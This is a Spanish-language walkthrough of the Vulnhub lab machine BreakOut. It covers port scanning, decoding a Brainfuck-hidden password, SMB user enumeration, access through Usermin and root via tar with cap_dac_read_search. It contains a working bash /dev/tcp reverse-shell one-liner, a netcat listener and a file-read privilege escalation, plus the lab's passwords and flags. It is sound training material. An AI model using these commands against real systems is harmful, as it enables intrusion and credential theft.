---
title: "Vulnhub - BreakOut"
date: 2025-11-26
platform: "vulnhub"
logo: "/images/vulnhub.png"
tags: ["Linux", "Capabilities", "Tar", "Webmin", "Usermin", "Brainfuck", "SMB"]
summary: "Resolución de la máquina BreakOut. Identificación de red local, desencriptación de código Brainfuck oculto en Apache, acceso mediante Usermin y escalada de privilegios abusando de capacidades (Linux Capabilities) en el binario tar."
draft: false
---

Esta es la maquina **[[BreakOut]]**, un laboratorio realizado durante las clases de **Especialización en Ciberseguridad**. En este reporte técnico analizaremos un vector de ataque que va desde la criptografía básica hasta el abuso de permisos especiales del sistema.

### Resumen de Técnicas Usadas

| **Técnica** | **Herramienta / Concepto** |
| :--- | :--- |
| **Reconocimiento de Red Local** | **[[Arp-Scan]]** |
| **Escaneo de Red y Enumeración** | **[[Nmap]]**, **[[ExtractPorts]]** |
| **Criptoanálisis Inicial** | **[[Brainfuck Cipher]]**, **[[Dcode]]** |
| **Enumeración de Usuarios (SMB)** | **[[Enum4linux]]**, **[[RID Cycling]]** |
| **Acceso Inicial e Intrusión** | **[[Usermin]]** (Puerto 20000), **[[Command Shell]]** |
| **Movimiento Lateral** | **[[Reverse Shell]]**, **[[NetCat]]** |
| **Escalada de Privilegios** | **[[Linux Capabilities]]** (**[[cap_dac_read_search]]**) |
| **Explotación de Binarios** | **[[Abuso de Tar]]**, **[[Sensitive File Read]]** |

---


Esta es una maquina que hice en las clases de Especialización en Ciberseguridad

---

Los conceptos que vamos a realizar en esta maquina son los siguientes:


|     |     |     |
| --- | --- | --- |
|     |     |     |

---
## Creación de entorno de Trabajo
Primero lo que vamos a realizar es la creación de nuestro entorno de trabajo:

```sh title:Entorno.Trabajo
❯ cd /home/yoyan/maquinas
❯ mkdir BreakOut
❯ cd BreakOut
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```
## Enumeración

### Arp-Scan
Primero lo que hacemos en las maquinas de Vulnhub es hacer un arp-scan para determinar que IP tiene la maquina objetivo.
```ls title:ARP-SCAN
arp-scan -a 

```
___
### Nmap
Una vez creado nuestro entorno de trabajo, procedemos a realizar un escaneo de puertos a la maquina objetivo.
```ls title:NMAP
cd nmap
nmap -p- --min-rate 5000 -vvv -sS -n -Pn 192.168.60.131 -oG puertos
#Te creara un archivo grepable para usar despues el extractports
extractPorts puertos
#Es un Script que te pone los puertos abierto en la Clipboard
#Una vez con los puertos realizamos un Escaneo mas Exhaustivo
nmap -p80,139,445,10000,20000 -sCV 192.168.60.131 -oN objetivo
#Te sale las versiones de los servicios de los puertos abiertos
```

Vemos los siguientes puertos corriendo en la maquina

| Puerto | Función                      | Versión |
| ------ | ---------------------------- | ------- |
| 80     | **HTTP** Apache              | 2.4.51  |
| 139    | **SMB**                      | 4.6.2   |
| 445    | **SMB**                      | 4.6.2   |
| 10000  | **HTTP** MiniServ **Webmin** | 1.981   |
| 20000  | **HTTP** MiniServ **Webmin** | 1.830   |
### Investigación de los Servicios encontrados 
Sabiendo esto lo que podemos hacer es mirar las diversas paginas web que tiene alojada las maquina objetivo
#### Puerto 80
Vemos que la pagina web es una pagina estándar de Apache2. 
![[Pasted image 20251126181537.png]]
Lo que podemos hacer siempre que vemos una pagina web es mirar si en el Inspeccionar podemos encontrar algo, ya que la pagina es muy simple y por si encontramos algo:
![[Pasted image 20251126181608.png]]

Vemos que en el modo de Inspeccionar hay un código encriptado, lo copiamos y lo almacenamos en la carpeta content:
```ls title:Almacenar.Datos
❯ cd content
❯ micro Apache2encryptado
#Pegamos el comentario de la pagina estandar de Apache2
```

Como vemos que es un código Encriptado, lo que podemos hacer es entrar en la pagina **Dcode** para desencriptar:
![[Pasted image 20251126182523.png]]

Poniendo el código que conseguimos en la pagina web de **Apache2** vemos los posibles encriptadores que usaron. Ahora lo que hacemos es usar el Brainfuck Cipher para desvelar que información tiene ese código encriptado.
![[Pasted image 20251126182854.png]]

Vemos que los que nos proporciono esto se puede interpretar como una posible contraseña, ahora lo que haremos será poner que el código que conseguimos en el archivo que creamos anteriormente.

```ls title:Almacenar.CIPHER
micro Apache2encryptado
Encriptado con Brainfuck
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.

Desencriptado con Dcode
.2uqPEfj3D<P'a-3
```
___
#### Puerto 10000
Entramos al Puerto y vemos que es el Webmin, y aun inspeccionando no vemos nada interesante.
![[Pasted image 20251126190721.png]]
___
#### Puerto 20000
Entramos en la pagina web del puerto 20000 y vemos que lo que esta alojado es el Usermin y volvemos a inspeccionar y no vemos nada relevante.
___
>Usermin
 es una interfaz web basada en web que permite a los usuarios normales gestionar sus propias cuentas en un servidor, principalmente a través de correo web, gestión de contraseñas y filtros de correo
___

![[Pasted image 20251126192929.png]]

### Investigación de posibles credenciales
Ahora que sabemos que tenemos al manos una contraseña, lo que podemos hacer es usar el [[enum4linux]] para hacer una enumeración de información atreves del protocolo **SMB**.
```ls title:ENUM4LINUX
enum4linux -a -i 192.168.60.131 >> Enum4linux
#Expotamos lo que nos da el enum4linux a un archivo para poder hacerle un cat
cat Enum4linux | grep "User"
#Nos proporcionas datos interesante.
 ======================================( Users on 192.168.60.131 )======================================
 =================( Users on 192.168.60.131 via RID cycling (RIDS: 500-550,1000-1050) )=================
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-22-1-1000 Unix User\cyber (Local User)
S-1-5-21-1683874020-4104641535-3793993001-501 BREAKOUT\nobody (Local User)
```

Vemos que nos dio un posible usuario llamado **cyber** con lo que lo podemos combinar con el otro dato que encontramos.

```ls title:Credenciales
Posible credenciales
cyber:.2uqPEfj3D<P'a-3
```

#### Comprobación de las credenciales 
Ahora vamos a probar las credenciales que conseguimos en las dos paginas que tenemos a ver en cual es la que funciona:
![[Pasted image 20251126200827.png]]

Entramos por **192.168.60.131:20000** ahora nos ponemos a investigar lo que podemos hacer.
___
## Explotación
Vemos que hay una opción que es un **Command Shell**, le damos y nos mete en una terminal dentro de la pagina web, lo que podemos hacer ahora es hacer una **Reverse Shell** para así darnos acceso a la maquina objetivo

```ls title:Pagina_Web
bash -i >& /dev/tcp/192.168.60.128/4444 0>%1
```

```ls title:Nuestra_Maquina
❯ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.60.131 50128
sh: 0: cant access tty; job control turned off
#Una vez conectado por NetCat procedemos a ver la 1º flag.
$ ls
tar
user.txt
$ cat user.txt
3mp!r3{You_Manage_To_Break_To_My_Secure_Access}
$ 
```

Ahora miramos los privilegios que tiene el usurario **cyber** en la maquina con los siguiente:
```ls title:Comprobar.Privilegios
cyber@breakout:~$ whoami
cyber
cyber@breakout:~$ sudo -l
bash: sudo: command not found
#Como no funciono el sudo -l probamos con lo siguiente.
cyber@breakout:~$ getcap -r / 2>/dev/null
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
```

Vemos que tenemos privilegio en **tar** y podemos ahora investigar por la maquina.
```ls title:Busqueda.Información
cyber@breakout:~$ pwd
/home/cyber
cyber@breakout:~$ cd ../..
cyber@breakout:~$ ls
bin
boot
dev
etc
opt
proc
root
usr
var
#Nos metemos en la carpeta /var para ver como se formo el Webmin y Usermin
cyber@breakout:/var$ ls -la
total 56
drwxr-xr-x 14 root root  4096 Oct 19  2021 .
drwxr-xr-x 18 root root  4096 Oct 19  2021 ..
drwxr-xr-x  2 root root  4096 Nov 26 06:25 backups
drwxr-xr-x 12 root root  4096 Oct 19  2021 cache
drwxr-xr-x 25 root root  4096 Oct 19  2021 lib
drwxrwsr-x  2 root staff 4096 Apr 10  2021 local
lrwxrwxrwx  1 root root     9 Oct 19  2021 lock -> /run/lock
drwxr-xr-x  8 root root  4096 Nov 26 12:59 log
drwxrwsr-x  2 root mail  4096 Oct 19  2021 mail
drwxr-xr-x  2 root root  4096 Oct 19  2021 opt
lrwxrwxrwx  1 root root     4 Oct 19  2021 run -> /run
drwxr-xr-x  5 root root  4096 Oct 19  2021 spool
drwxrwxrwt  5 root root  4096 Nov 26 12:59 tmp
drwxr-xr-x  3 root root  4096 Nov 26 04:34 usermin
drwx------  3 root bin   4096 Nov 26 06:28 webmin
drwxr-xr-x  3 root root  4096 Oct 19  2021 www
#Vemos algo que nos puede interesar que son la carpeta de backups, que puede tener copias de seguridad en .tar
cyber@breakout:/var$ cd backups
cyber@breakout:/var/backups$ ls -la
total 480
drwxr-xr-x  2 root root   4096 Nov 26 06:25 .
drwxr-xr-x 14 root root   4096 Oct 19  2021 ..
-rw-r--r--  1 root root  40960 Nov 26 06:25 alternatives.tar.0
-rw-r--r--  1 root root  12732 Oct 19  2021 apt.extended_states.0
-rw-r--r--  1 root root      0 Nov 26 06:25 dpkg.arch.0
-rw-r--r--  1 root root    186 Oct 19  2021 dpkg.diversions.0
-rw-r--r--  1 root root    135 Oct 19  2021 dpkg.statoverride.0
-rw-r--r--  1 root root 413488 Oct 19  2021 dpkg.status.0
-rw-------  1 root root     17 Oct 20  2021 .old_pass.bak
#El archivo que nos importa es .old_pass.bak que como dice el nombre es la contraseña antigua y puede seguir siendo la misma, volvemos a /home/cyber y intentamos comprimir el archivo para descomprimirlo de vuelta.
cyber@breakout:/var/backups$ cd /home/cyber
cyber@breakout:~$ ./tar -cvf password.tar /var/backups/.old_pass.bak
cyber@breakout:~$ ./tar -xvf password.tar
cyber@breakout:~$ ls 
tar
user.txt
var
cyber@breakout:~$ cd var/backups
cyber@breakout:~/var/backups$ ls -la
cyber@breakout:~/var/backups$ cat .old_pass.bak
Ts&4&YurgtRX(=~h
```

## Entramos como Root

Ahora que tenemos una contraseña totalmente diferente a la que teníamos, lo que haremos seria **guardarla en credenciales** y después probar si es la contraseña del usuario **root** 

```ls title:Guarda.Credenciales
micro Credenciales
Posible credenciales
cyber:.2uqPEfj3D<P'a-3
root:Ts&4&YurgtRX(=~h
```

```ls title:Escalar.ROOT
cyber@breakout:~$ su root
su root
Password: Ts&4&YurgtRX(=~h
root@breakout:~$ whoami
root
root@breakout:~$ cd
root@breakout:~$ ls
r00t.txt
root@breakout:~$ cat r00t.txt
3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}

Author: Icex64 & Empire Cybersecurity
```